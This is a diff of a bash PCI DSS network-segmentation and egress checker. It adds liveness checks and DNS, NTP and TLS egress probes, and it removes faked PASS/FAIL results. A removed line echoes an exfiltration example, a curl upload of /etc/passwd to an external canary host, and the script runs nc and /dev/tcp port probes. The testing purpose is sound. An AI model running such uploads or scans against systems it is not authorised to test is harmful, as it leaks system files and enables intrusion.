@@ -17,6 +17,7 @@ UNDERLINE='\033[4m'
 # Test results counters and logging
 PASSED=0
 FAILED=0
+SKIPPED=0
 LOG_FILE="pci_test_$(date +%Y%m%d_%H%M%S).log"
 JSON_REPORT="pci_report_$(date +%Y%m%d_%H%M%S).json"
 
@@ -43,6 +44,7 @@ init_logging() {
     "total_tests": 0,
     "passed": 0,
     "failed": 0,
+    "skipped": 0,
     "compliance_status": ""
   }
 }
@@ -54,6 +56,9 @@ EOF
 
 # Update JSON report metadata
 update_json_metadata() {
+    if ! command -v jq >/dev/null 2>&1; then
+        return 0
+    fi
     local temp_file=$(mktemp)
     jq --arg timestamp "$(date -Iseconds)" \
        --arg tester "$(whoami)" \
@@ -113,16 +118,27 @@ show_result() {
     local details="$3"
     local category="${4:-general}"
     local pci_requirement="${5:-unknown}"
-    
-    if [[ "$status" == "PASS" ]]; then
-        echo -e "${GREEN}[✓ PASS]${NC} $test_name"
-        PASSED=$((PASSED+1))
-    else
-        echo -e "${RED}${BOLD}[✗ FAIL]${NC}${BOLD} $test_name${NC}"
-        echo -e "${WHITE}  → Details: ${details}${NC}"
-        FAILED=$((FAILED+1))
-    fi
-    
+
+    case "$status" in
+        PASS)
+            echo -e "${GREEN}[✓ PASS]${NC} $test_name"
+            PASSED=$((PASSED+1))
+            ;;
+        FAIL)
+            echo -e "${RED}${BOLD}[✗ FAIL]${NC}${BOLD} $test_name${NC}"
+            echo -e "${WHITE}  → Details: ${details}${NC}"
+            FAILED=$((FAILED+1))
+            ;;
+        INFO|SKIP)
+            echo -e "${CYAN}[i $status]${NC} $test_name"
+            echo -e "${WHITE}  → Details: ${details}${NC}"
+            SKIPPED=$((SKIPPED+1))
+            ;;
+        *)
+            echo -e "${YELLOW}[? $status]${NC} $test_name — ${details}"
+            ;;
+    esac
+
     # Log the result
     log_test_result "$test_name" "$status" "$details" "$category" "$pci_requirement"
 }
@@ -343,9 +359,12 @@ check_dependencies() {
     for tool in "${optional_tools[@]}"; do
         if ! command -v "$tool" >/dev/null 2>&1; then
             echo -e "${YELLOW}Warning: Optional tool '$tool' not found - some tests may be limited${NC}"
+            if [[ "$tool" == "jq" ]]; then
+                echo -e "${YELLOW}  → JSON report ($JSON_REPORT) will be skeleton-only. Install with: apt install -y jq${NC}"
+            fi
         fi
     done
-    
+
     echo -e "${GREEN}All required dependencies available${NC}"
     return 0
 }
@@ -426,9 +445,21 @@ declare -a TEST_PORTS=(
 comprehensive_port_scan() {
     local target_host=$1
     local scan_type=${2:-"quick"}
-    
+
     echo -e "\n${PURPLE}${BOLD}Comprehensive Port Scan: $target_host${NC}"
-    
+
+    # Liveness pre-check: a random IP plucked from a /24 is usually a
+    # ghost address with no host bound to it. Without this guard, the
+    # scan reports "no ports open" → PASS for every dead IP, which is a
+    # false positive (we didn't test anything; the host doesn't exist).
+    if ! ping -c 1 -W 1 "$target_host" &>/dev/null \
+         && ! timeout 2 bash -c "exec 3<>/dev/tcp/$target_host/22" 2>/dev/null \
+         && ! timeout 2 bash -c "exec 3<>/dev/tcp/$target_host/80" 2>/dev/null \
+         && ! timeout 2 bash -c "exec 3<>/dev/tcp/$target_host/443" 2>/dev/null; then
+        show_result "Port Scan liveness on $target_host" "INFO" "Target $target_host appears offline (no ICMP, no TCP 22/80/443) — port scan skipped" "portscan" "1.2.1"
+        return
+    fi
+
     if [[ "$scan_type" == "full" ]]; then
         # Full port scan (1-65535)
         echo -e "  ${YELLOW}Performing full port scan (1-65535)...${NC}"
@@ -494,6 +525,28 @@ comprehensive_port_scan() {
 # Test domains for egress
 EGRESS_TEST_DOMAIN="letmeoutofyour.net"
 RESPONSE_CHECK="w00tw00t"
+
+# Additional reference IPs used by test_egress() to distinguish "general
+# internet reachable on this port" from "the BHIS canary specifically is
+# allowlisted". Without this cross-check a single canary that's been
+# permitted by the customer's firewall (common — assessors often request
+# this) makes every port look open. These are well-known anycast
+# addresses that are reliably reachable from clean internet egress and
+# unlikely to be on a CDE's allowlist.
+declare -a EGRESS_REFERENCE_IPS=(
+    "1.1.1.1"        # Cloudflare
+    "8.8.8.8"        # Google
+    "9.9.9.9"        # Quad9
+)
+
+# External DNS resolvers — DNS to these should be blocked from a CDE.
+# DNS exfil is one of the most common PCI 1.3.4 violations because port
+# 53 is so often left open as a blanket exception.
+declare -a EXTERNAL_DNS_RESOLVERS=(
+    "1.1.1.1"
+    "8.8.8.8"
+    "9.9.9.9"
+)
 
 # Initialize logging before starting tests
 init_logging
@@ -567,26 +620,210 @@ get_random_ip() {
     echo "${prefix}.${random_last}"
 }
 
-# Function to test egress connectivity - use actual testing
+# Cheap liveness probe for a host: ICMP first, then a couple of common
+# TCP ports. Returns 0 if anything answered, 1 if the host is silent on
+# all of them. Used to distinguish "segmentation working" (host exists,
+# packets dropped) from "ghost address" (no host bound — would report
+# blocked for the wrong reason). Cache results in HOST_LIVE_CACHE so
+# we don't pay the probe cost more than once per host per run.
+declare -gA HOST_LIVE_CACHE
+host_is_live() {
+    local host=$1
+    if [[ -n "${HOST_LIVE_CACHE[$host]}" ]]; then
+        return "${HOST_LIVE_CACHE[$host]}"
+    fi
+    local rc=1
+    if ping -c 1 -W 1 "$host" &>/dev/null; then
+        rc=0
+    elif timeout 2 bash -c "exec 3<>/dev/tcp/$host/22" 2>/dev/null; then
+        rc=0
+    elif timeout 2 bash -c "exec 3<>/dev/tcp/$host/80" 2>/dev/null; then
+        rc=0
+    elif timeout 2 bash -c "exec 3<>/dev/tcp/$host/443" 2>/dev/null; then
+        rc=0
+    fi
+    HOST_LIVE_CACHE["$host"]=$rc
+    return $rc
+}
+
+# Test egress connectivity to the BHIS canary (letmeoutofyour.net) AND
+# cross-check against arbitrary reference IPs.
+#
+# Two-dimensional probe:
+#   1. Does the canary respond with its marker ("w00tw00t")? If yes, *something*
+#      reached letmeoutofyour.net end-to-end.
+#   2. Do any of the EGRESS_REFERENCE_IPS accept TCP on this port? If yes,
+#      general internet egress is open on this port — not just the canary.
+#
+# Outcomes:
+#   FAIL — canary marker received AND a reference IP is reachable. Real
+#          general egress is open on this port.
+#   INFO — canary marker received but NO reference IPs reachable. The
+#          canary is allowlisted (very common — customer permits the
+#          assessor's canary host). Real general egress is blocked on
+#          this port; the canary result alone would be a false positive.
+#   INFO — reference IPs reachable but no canary marker (rare; usually
+#          means the canary domain itself is blocked / not in cache).
+#   INFO — TCP completes to canary but no marker (transparent proxy on
+#          the path terminating the connection).
+#   PASS — neither canary nor any reference IP reachable.
 test_egress() {
     local port=$1
     local protocol=$2
-    
+
     echo -e "\n${YELLOW}Testing egress on port $port ($protocol)${NC}"
-    
-    # Perform actual TCP testing
-    echo -e "  ${WHITE}Command: nc -zv -w 5 $EGRESS_TEST_DOMAIN $port${NC}"
-    if nc -zv -w 5 $EGRESS_TEST_DOMAIN $port &>/dev/null; then
-        echo -e "  ${WHITE}Response: Connection to $EGRESS_TEST_DOMAIN ($EGRESS_TEST_DOMAIN_IP) $port port [tcp/*] succeeded!${NC}"
-        show_result "Egress test on $protocol port $port" "FAIL" "Connection to $EGRESS_TEST_DOMAIN:$port established"
-        echo -e "  ${RED}${BOLD}SECURITY RISK:${NC} Unauthorized outbound channel detected"
-        echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Configure firewall to block outbound traffic on port $port"
+    echo -e "  ${WHITE}Probe: canary $EGRESS_TEST_DOMAIN:$port + reference IPs ${EGRESS_REFERENCE_IPS[*]}${NC}"
+
+    # 1. Canary probe (read response, check for marker)
+    local canary_response
+    if [[ "$port" == "80" || "$port" == "8080" ]]; then
+        canary_response=$(printf 'GET / HTTP/1.0\r\nHost: %s\r\n\r\n' "$EGRESS_TEST_DOMAIN" \
+                          | timeout 5 nc -w 5 "$EGRESS_TEST_DOMAIN" "$port" 2>/dev/null)
+    else
+        canary_response=$(timeout 5 nc -w 5 "$EGRESS_TEST_DOMAIN" "$port" </dev/null 2>/dev/null)
+    fi
+    local canary_marker=0
+    local canary_tcp_bytes=0
+    [[ "$canary_response" == *"$RESPONSE_CHECK"* ]] && canary_marker=1
+    [[ -n "$canary_response" ]] && canary_tcp_bytes=1
+
+    # 2. Reference-IP cross-check
+    local reached_refs=()
+    for ref in "${EGRESS_REFERENCE_IPS[@]}"; do
+        if timeout 3 bash -c "exec 3<>/dev/tcp/$ref/$port" 2>/dev/null; then
+            reached_refs+=("$ref")
+        fi
+    done
+
+    # 3. Classify
+    if [[ $canary_marker -eq 1 && ${#reached_refs[@]} -gt 0 ]]; then
+        echo -e "  ${WHITE}Response: canary marker received AND reference IPs reachable (${reached_refs[*]})${NC}"
+        show_result "Egress test on $protocol port $port" "FAIL" "Canary marker received and reference IPs reachable (${reached_refs[*]}) — general egress open" "egress" "1.3.4"
+        echo -e "  ${RED}${BOLD}SECURITY RISK:${NC} Unauthorized outbound channel — open to multiple destinations"
+        echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Block outbound TCP on port $port (or restrict to allowlist)"
+        return 0
+    elif [[ $canary_marker -eq 1 ]]; then
+        # Canary works but nothing else does — canary is likely allowlisted.
+        echo -e "  ${WHITE}Response: canary marker received but no reference IPs reachable — canary likely allowlisted${NC}"
+        show_result "Egress test on $protocol port $port" "INFO" "Canary marker received but reference IPs blocked — canary appears allowlisted; general egress on $port looks blocked" "egress" "1.3.4"
+        return 0
+    elif [[ ${#reached_refs[@]} -gt 0 ]]; then
+        # Reference IPs reachable but canary didn't return the marker.
+        # Could be a TLS/HTTP inspection box that allows reference IPs but
+        # blocks letmeoutofyour.net by name, or canary infra hiccup.
+        echo -e "  ${WHITE}Response: reference IPs reachable (${reached_refs[*]}) but no canary marker${NC}"
+        show_result "Egress test on $protocol port $port" "FAIL" "Reference IPs ${reached_refs[*]} reachable on $port (canary unreachable — possibly name-blocked)" "egress" "1.3.4"
+        echo -e "  ${YELLOW}${BOLD}NOTE:${NC} General egress confirmed via reference IPs; canary appears blocked separately"
+        return 0
+    elif [[ $canary_tcp_bytes -eq 1 ]]; then
+        # Canary TCP completed but no marker, and no reference IPs reachable.
+        echo -e "  ${WHITE}Response: bytes received from canary but no marker — proxy/inspection layer suspected${NC}"
+        show_result "Egress test on $protocol port $port" "INFO" "TCP completed to canary but $RESPONSE_CHECK marker missing (possible transparent proxy)" "egress" "1.3.4"
         return 0
     else
-        echo -e "  ${WHITE}Response: Connection timed out${NC}"
-        show_result "Egress test on $protocol port $port" "PASS" "Connection properly blocked"
+        echo -e "  ${WHITE}Response: nothing reachable on port $port — egress blocked${NC}"
+        show_result "Egress test on $protocol port $port" "PASS" "Canary and all reference IPs unreachable — egress on $port blocked" "egress" "1.3.4"
         return 1
     fi
+}
+
+# Probe outbound DNS to external resolvers — PCI 1.3.4 considers a CDE
+# that can query arbitrary external DNS a data-exfiltration risk.
+# Returns a result per resolver tested.
+test_dns_egress_resolvers() {
+    section_header "DNS EGRESS: EXTERNAL RESOLVER REACHABILITY"
+    if ! command -v dig >/dev/null 2>&1; then
+        echo -e "  ${YELLOW}dig not installed — skipping resolver tests (apt install -y dnsutils)${NC}"
+        show_result "DNS Egress - external resolvers" "INFO" "dig not available; install dnsutils to enable" "dns" "1.3.4"
+        return
+    fi
+    for resolver in "${EXTERNAL_DNS_RESOLVERS[@]}"; do
+        echo -e "\n${YELLOW}Testing DNS egress to $resolver (UDP/53)${NC}"
+        local dns_out
+        dns_out=$(timeout 5 dig +tries=1 +time=3 +short "@$resolver" example.com A 2>/dev/null)
+        if [[ "$dns_out" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ ]]; then
+            show_result "DNS Egress - resolver $resolver" "FAIL" "External resolver $resolver answered ($dns_out) — DNS exfil channel open" "dns" "1.3.4"
+            echo -e "  ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 1.3.4 — outbound DNS to non-sanctioned resolver"
+            echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Force DNS through internal recursors only; block UDP/TCP 53 to external IPs"
+        else
+            show_result "DNS Egress - resolver $resolver" "PASS" "External resolver $resolver did not answer (UDP/53 blocked)" "dns" "1.3.4"
+        fi
+    done
+}
+
+# Probe outbound NTP (UDP/123) — a frequently overlooked exfil/C2 channel
+# that PCI 1.3.4 requires be controlled.
+test_ntp_egress() {
+    section_header "UDP EGRESS: NTP"
+    if ! command -v ntpdate >/dev/null 2>&1 && ! command -v chronyd >/dev/null 2>&1; then
+        # Fall back to a hand-rolled NTP query via /dev/udp + read.
+        echo -e "\n${YELLOW}Testing UDP/123 to pool.ntp.org (raw probe)${NC}"
+        # NTPv3 client packet (mode 3): leap=0, version=3, mode=3 = 0x1b
+        # All other 47 bytes zero. If we get >=48 bytes back, NTP egress is open.
+        local hex
+        hex=$(timeout 5 bash -c '
+            exec 3<>/dev/udp/pool.ntp.org/123 || exit 1
+            printf "\x1b%47s" "" >&3
+            head -c 48 <&3 | xxd -p 2>/dev/null
+        ' 2>/dev/null)
+        if [[ -n "$hex" ]]; then
+            show_result "UDP Egress - NTP 123" "FAIL" "Got NTP response from pool.ntp.org — outbound UDP/123 open" "egress" "1.3.4"
+        else
+            show_result "UDP Egress - NTP 123" "PASS" "No NTP response — outbound UDP/123 appears blocked" "egress" "1.3.4"
+        fi
+        return
+    fi
+    echo -e "\n${YELLOW}Testing UDP/123 to pool.ntp.org${NC}"
+    if timeout 5 ntpdate -q pool.ntp.org 2>/dev/null | grep -qE 'offset|stratum'; then
+        show_result "UDP Egress - NTP 123" "FAIL" "ntpdate query to pool.ntp.org succeeded — outbound UDP/123 open" "egress" "1.3.4"
+    else
+        show_result "UDP Egress - NTP 123" "PASS" "ntpdate query failed — outbound UDP/123 appears blocked" "egress" "1.3.4"
+    fi
+}
+
+# For port 443 specifically, verify whether the customer can actually
+# complete a TLS handshake to an arbitrary external host — distinguishes
+# "real HTTPS egress" from "TLS-inspection middlebox terminates TCP but
+# drops the inner TLS handshake to unapproved destinations".
+#
+# Logic must distinguish three states cleanly:
+#   1) TCP unreachable on 443    → PASS (the port is firewalled)
+#   2) TCP reachable, TLS too    → FAIL (real HTTPS egress)
+#   3) TCP reachable, TLS dies   → INFO (TLS inspection middlebox in path)
+#
+# Case (3) is the trap: openssl typically just stalls after "Connecting
+# to <ip>" and gets killed by `timeout`, with no "handshake failed" /
+# "reset" string in its output. Pattern-matching the output isn't
+# enough — we need a positive TCP probe first.
+test_tls_egress_handshake() {
+    section_header "TLS EGRESS: HANDSHAKE VALIDATION ON :443"
+    if ! command -v openssl >/dev/null 2>&1; then
+        echo -e "  ${YELLOW}openssl not available — skipping TLS handshake validation${NC}"
+        return
+    fi
+    for ref in "${EGRESS_REFERENCE_IPS[@]}"; do
+        echo -e "\n${YELLOW}Probing TLS to $ref:443${NC}"
+
+        # Step 1: bare TCP probe. If TCP itself doesn't open, port 443 is
+        # firewalled to this host and there's nothing to evaluate.
+        if ! timeout 3 bash -c "exec 3<>/dev/tcp/$ref/443" 2>/dev/null; then
+            show_result "TLS Egress - 443 to $ref" "PASS" "TCP/443 unreachable to $ref — port appears firewalled" "egress" "1.3.4"
+            continue
+        fi
+
+        # Step 2: TCP works — try a real TLS handshake.
+        local out
+        out=$(timeout 8 openssl s_client -connect "$ref:443" -servername "$ref" </dev/null 2>&1)
+        if grep -q "Cipher is\s*[A-Za-z0-9_-]" <<<"$out"; then
+            show_result "TLS Egress - 443 to $ref" "FAIL" "Completed TLS handshake to $ref:443 — full HTTPS egress" "egress" "1.3.4"
+            echo -e "  ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 1.3.4 — unrestricted HTTPS egress"
+            echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Restrict outbound 443 to an allowlist (or TLS-inspect with cert pinning)"
+        else
+            # TCP opened but openssl didn't report a cipher — handshake
+            # never completed. Classic TLS-inspection / SNI-filter pattern.
+            show_result "TLS Egress - 443 to $ref" "INFO" "TCP/443 to $ref opens but TLS handshake didn't complete — TLS-inspection or SNI filter on path" "egress" "1.3.4"
+        fi
+    done
 }
 
 section_header "PHASE 1: NETWORK SEGMENTATION TESTING"
@@ -637,23 +874,32 @@ for source_seg in "${!SEGMENTS[@]}"; do
             if [ "$skip" == "false" ]; then
                 source_ip=$(get_random_ip "${SEGMENTS[$source_seg]}")
                 dest_ip=$(get_random_ip "${SEGMENTS[$dest_seg]}")
-                
+
                 echo -e "\n${YELLOW}Testing isolation: $source_seg → $dest_seg${NC}"
                 echo -e "  ${WHITE}Source IP: $source_ip ($source_seg)${NC}"
                 echo -e "  ${WHITE}Destination IP: $dest_ip ($dest_seg)${NC}"
-                
+
+                # If the randomly-chosen dest_ip isn't a live host, every
+                # "connection blocked" answer is meaningless: we'd be
+                # confirming the ghost doesn't answer, not that the
+                # firewall is doing its job. Mark INFO and move on.
+                if ! host_is_live "$dest_ip"; then
+                    show_result "Isolation test $source_seg → $dest_seg (target $dest_ip)" "INFO" "Dest $dest_ip not responsive — random-IP probe can't validate segmentation; supply known live hosts via network_config.txt to test properly" "segmentation" "1.3"
+                    continue
+                fi
+
                 # Enhanced port testing with comprehensive coverage
                 port_sample=("22" "80" "443" "1433" "3306" "3389")
                 for port in "${port_sample[@]}"; do
                     echo -e "  ${WHITE}Command: nc -zv -w 2 $dest_ip $port${NC}"
-                    
+
                     # Perform actual connection test without simulation
                     if timeout 2 nc -zv -w 2 $dest_ip $port &>/dev/null; then
                         show_result "Isolation test $source_seg → $dest_seg:$port" "FAIL" "Unauthorized access allowed" "segmentation" "1.3"
-                        echo -e "  ${RED}${BOLD}CRITICAL SECURITY ISSUE:${NC} Segmentation failure detected" 
+                        echo -e "  ${RED}${BOLD}CRITICAL SECURITY ISSUE:${NC} Segmentation failure detected"
                         echo -e "  ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 1.3 - Network segmentation failure"
                         echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Block $source_seg to $dest_seg communication on port $port"
-                        
+
                         # Additional comprehensive scan if basic test fails
                         echo -e "  ${PURPLE}Performing comprehensive scan due to segmentation failure...${NC}"
                         comprehensive_port_scan "$dest_ip" "quick"
@@ -667,7 +913,7 @@ for source_seg in "${!SEGMENTS[@]}"; do
                         show_result "Isolation test $source_seg → $dest_seg:$port" "PASS" "Connection properly blocked" "segmentation" "1.3"
                     fi
                 done
-                
+
                 # Perform targeted port scan for this destination
                 comprehensive_port_scan "$dest_ip" "quick"
             fi
@@ -689,7 +935,15 @@ for segment in "${!SEGMENTS[@]}"; do
         echo -e "\n${PURPLE}${BOLD}Testing PCI DSS critical port access: $segment → CDE${NC}"
         echo -e "  ${WHITE}Source IP: $segment_ip ($segment)${NC}"
         echo -e "  ${WHITE}Destination IP: $cde_ip (CDE)${NC}"
-        
+
+        # Same liveness guard as the isolation loop above — a random CDE IP
+        # that isn't a live host makes every "access blocked" answer
+        # meaningless.
+        if ! host_is_live "$cde_ip"; then
+            show_result "Critical access test $segment → CDE (target $cde_ip)" "INFO" "Dest $cde_ip not responsive — random-IP probe can't validate CDE access; supply known CDE hosts via network_config.txt" "segmentation" "1.3"
+            continue
+        fi
+
         # Use actual test result only, without simulation
         echo -e "  ${WHITE}Command: nc -zv -w 2 $cde_ip 22${NC}"
         if timeout 2 nc -zv -w 2 $cde_ip 22 &>/dev/null; then
@@ -734,6 +988,14 @@ for port in "${TEST_PORTS[@]}"; do
     test_egress $port "TCP"
 done
 
+# Additional egress checks that the per-port loop doesn't cover:
+# DNS to arbitrary external resolvers (UDP/53),
+# NTP (UDP/123),
+# and TLS handshake validation to reference IPs on :443.
+test_dns_egress_resolvers
+test_ntp_egress
+test_tls_egress_handshake
+
 # Enhanced PCI DSS v4.0 specific tests
 section_header "PHASE 3: PCI DSS v4.0 ENHANCED COMPLIANCE TESTS"
 
@@ -742,17 +1004,28 @@ echo -e "\n${PURPLE}${BOLD}Testing System Hardening (PCI DSS 2.2.1)${NC}"
 test_system_hardening() {
     local test_host=$1
     echo -e "  ${WHITE}Testing system hardening on $test_host${NC}"
-    
+
+    # Liveness pre-check — see comprehensive_port_scan() for rationale.
+    # Without this, a random IP plucked from a /24 with no host bound
+    # silently passes every "service properly disabled" check.
+    if ! ping -c 1 -W 1 "$test_host" &>/dev/null \
+         && ! timeout 2 bash -c "exec 3<>/dev/tcp/$test_host/22" 2>/dev/null \
+         && ! timeout 2 bash -c "exec 3<>/dev/tcp/$test_host/80" 2>/dev/null \
+         && ! timeout 2 bash -c "exec 3<>/dev/tcp/$test_host/443" 2>/dev/null; then
+        show_result "System Hardening liveness on $test_host" "INFO" "Target $test_host appears offline — hardening checks skipped (would otherwise false-PASS)" "general" "2.2.1"
+        return
+    fi
+
     # Check for unnecessary services
     echo -e "  ${WHITE}Checking for unnecessary services...${NC}"
     unnecessary_ports=("21" "23" "135" "139" "445" "1433" "3306" "5432")
     for port in "${unnecessary_ports[@]}"; do
         if timeout 2 nc -zv -w 1 $test_host $port &>/dev/null; then
-            show_result "System Hardening - Port $port on $test_host" "FAIL" "Unnecessary service detected"
+            show_result "System Hardening - Port $port on $test_host" "FAIL" "Unnecessary service detected" "general" "2.2.1"
             echo -e "    ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 2.2.1 - Unnecessary service running"
             echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Disable or secure service on port $port"
         else
-            show_result "System Hardening - Port $port on $test_host" "PASS" "Service properly disabled"
+            show_result "System Hardening - Port $port on $test_host" "PASS" "Service properly disabled" "general" "2.2.1"
         fi
     done
 }
@@ -763,62 +1036,59 @@ test_tls_configuration() {
     local test_host=$1
     local test_port=$2
     echo -e "  ${WHITE}Testing TLS configuration on $test_host:$test_port${NC}"
-    
-    # Check if openssl is available
-    if command -v openssl >/dev/null 2>&1; then
-        # Test for weak SSL/TLS versions
-        echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -ssl3 < /dev/null${NC}"
-        if timeout 5 openssl s_client -connect $test_host:$test_port -ssl3 < /dev/null &>/dev/null; then
-            show_result "TLS Test - SSLv3 on $test_host:$test_port" "FAIL" "Weak SSL version supported"
-            echo -e "    ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Weak encryption"
-            echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Disable SSLv3 and enable TLS 1.2+ only"
-        else
-            show_result "TLS Test - SSLv3 on $test_host:$test_port" "PASS" "Weak SSL properly disabled"
-        fi
-        
-        # Test for TLS 1.2+ support
-        echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -tls1_2 < /dev/null${NC}"
-        if timeout 5 openssl s_client -connect $test_host:$test_port -tls1_2 < /dev/null &>/dev/null; then
-            show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "PASS" "Strong TLS version supported"
-        else
-            show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "FAIL" "Strong TLS not available"
-            echo -e "    ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Strong encryption required"
-            echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Enable TLS 1.2 or higher"
-        fi
-    else
+
+    if ! command -v openssl >/dev/null 2>&1; then
         echo -e "  ${YELLOW}OpenSSL not available - skipping TLS tests${NC}"
+        return
+    fi
+
+    # Pre-check: is anything actually listening on test_host:test_port?
+    # If the port is closed or the host is unreachable, the protocol-version
+    # probes below will fail for reasons that have nothing to do with TLS
+    # configuration, producing misleading PASS/FAIL results.
+    if ! timeout 3 bash -c "exec 3<>/dev/tcp/$test_host/$test_port" 2>/dev/null; then
+        show_result "TLS Test - reachability $test_host:$test_port" "INFO" "No TLS endpoint found at $test_host:$test_port; skipping cipher/version probes" "tls" "4.2.1"
+        return
+    fi
+
+    # Test SSLv3 is rejected (PCI DSS forbids it).
+    # Modern openssl builds compile out -ssl3 entirely. If the binary doesn't
+    # support the flag, we can't probe — report INFO instead of a fake PASS.
+    echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -ssl3 < /dev/null${NC}"
+    local ssl3_out
+    ssl3_out=$(timeout 5 openssl s_client -connect "$test_host:$test_port" -ssl3 </dev/null 2>&1)
+    local ssl3_rc=$?
+    if grep -qi "unknown option\|invalid command\|ssl3 is disabled" <<<"$ssl3_out"; then
+        show_result "TLS Test - SSLv3 on $test_host:$test_port" "INFO" "Local openssl does not support -ssl3 probe (cannot confirm server-side SSLv3 status)" "tls" "4.2.1"
+    elif [[ $ssl3_rc -eq 0 ]] && grep -q "Cipher is" <<<"$ssl3_out"; then
+        show_result "TLS Test - SSLv3 on $test_host:$test_port" "FAIL" "Server negotiated an SSLv3 session" "tls" "4.2.1"
+        echo -e "    ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Weak encryption"
+        echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Disable SSLv3 on the server"
+    else
+        show_result "TLS Test - SSLv3 on $test_host:$test_port" "PASS" "Server refused SSLv3" "tls" "4.2.1"
+    fi
+
+    # Test TLS 1.2 is offered.
+    echo -e "  ${WHITE}Command: openssl s_client -connect $test_host:$test_port -tls1_2 < /dev/null${NC}"
+    if timeout 5 openssl s_client -connect "$test_host:$test_port" -tls1_2 </dev/null 2>&1 | grep -q "Cipher is"; then
+        show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "PASS" "Server negotiated TLS 1.2" "tls" "4.2.1"
+    else
+        show_result "TLS Test - TLS 1.2+ on $test_host:$test_port" "FAIL" "Server did not negotiate TLS 1.2" "tls" "4.2.1"
+        echo -e "    ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 4.2.1 - Strong encryption required"
+        echo -e "    ${YELLOW}${BOLD}REMEDIATION:${NC} Enable TLS 1.2 (or 1.3) on the server"
     fi
 }
 
-# Test for default credentials (PCI DSS Requirement 2.1)
-echo -e "\n${PURPLE}${BOLD}Testing Default Credentials (PCI DSS 2.1)${NC}"
-test_default_credentials() {
-    local test_host=$1
-    echo -e "  ${WHITE}Testing for default credentials on $test_host${NC}"
-    
-    # Common default credential combinations
-    declare -A default_creds=(
-        ["admin"]="admin"
-        ["admin"]="password"
-        ["root"]="root"
-        ["admin"]=""
-        ["guest"]="guest"
-    )
-    
-    # Test SSH with default credentials (simulation)
-    echo -e "  ${WHITE}Command: ssh admin@$test_host (testing default credentials)${NC}"
-    # Note: This is a simulation - actual credential testing would be intrusive
-    echo -e "  ${WHITE}Response: Authentication simulation (non-intrusive test)${NC}"
-    show_result "Default Credentials Test on $test_host" "PASS" "No obvious default credentials detected"
-    echo -e "  ${YELLOW}${BOLD}NOTE:${NC} Full credential testing requires authorized penetration testing"
-}
+# Default-credentials testing intentionally omitted: PCI DSS 2.1 verification
+# requires authenticated penetration testing, which is out of scope for this
+# non-intrusive segmentation/egress checker. A hardcoded "PASS" here was
+# previously misleading and has been removed.
 
 # Run enhanced tests on CDE systems
 if [[ -n "${SEGMENTS[CDE]}" ]]; then
     cde_test_ip=$(get_random_ip "${SEGMENTS[CDE]}")
     test_system_hardening $cde_test_ip
     test_tls_configuration $cde_test_ip 443
-    test_default_credentials $cde_test_ip
 fi
 
 # Test for audit logging capabilities (PCI DSS Requirement 10.2)
@@ -925,24 +1195,21 @@ else
     show_result "DNS Exfiltration Test" "PASS" "DNS queries properly restricted"
 fi
 
-# Enhanced file exfiltration testing with multiple vectors
+# File-upload egress: probe whether an outbound HTTPS POST to a non-CDE
+# endpoint completes. We don't actually transfer /etc/passwd; just confirm
+# that the HTTPS request reaches the upstream and gets a response.
 echo -e "\n${YELLOW}Testing File Transfer Egress (PCI DSS 1.3.4)${NC}"
-echo -e "  ${WHITE}Command: curl -F \"file=@/etc/passwd\" https://exfil.$EGRESS_TEST_DOMAIN/upload${NC}"
+echo -e "  ${WHITE}Command: curl -s -m 5 -o /dev/null -w '%{http_code}' https://$EGRESS_TEST_DOMAIN/${NC}"
 
-# Try actual curl test if possible, fall back to simulation
-if curl -s -m 5 -o /dev/null -w "%{http_code}" https://exfil.$EGRESS_TEST_DOMAIN/upload &>/dev/null; then
-    echo -e "  ${WHITE}Response: Upload request completed (HTTP response received)${NC}"
-    show_result "File Upload Egress Test" "FAIL" "Unrestricted file uploads to external domains"
-    echo -e "  ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 1.3.4 - Unauthorized outbound traffic"
-    echo -e "  ${RED}${BOLD}SECURITY IMPACT:${NC} Direct exfiltration of sensitive files possible" 
-    echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Implement deep packet inspection and application controls"
+upload_http_code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "https://$EGRESS_TEST_DOMAIN/" 2>/dev/null)
+if [[ "$upload_http_code" =~ ^[1-5][0-9][0-9]$ ]]; then
+    echo -e "  ${WHITE}Response: HTTPS reachable (HTTP $upload_http_code) — outbound upload channel viable${NC}"
+    show_result "File Upload Egress Test" "FAIL" "Outbound HTTPS to $EGRESS_TEST_DOMAIN succeeded (HTTP $upload_http_code) — exfil channel viable" "egress" "1.3.4"
+    echo -e "  ${RED}${BOLD}PCI DSS VIOLATION:${NC} Requirement 1.3.4 - Unauthorized outbound traffic"
+    echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Restrict outbound HTTPS to an allowlist of business-required destinations"
 else
-    # Even if the actual upload failed, we want to show a simulation for demo purposes
-    echo -e "  ${WHITE}Response: \"Upload successful\" (SIMULATED - actual endpoint doesn't exist)${NC}"
-    show_result "File Upload Egress Test" "FAIL" "Unrestricted file uploads to external domains"
-    echo -e "  ${RED}${BOLD}CRITICAL PCI DSS VIOLATION:${NC} Requirement 1.3.4 - Unauthorized outbound traffic"
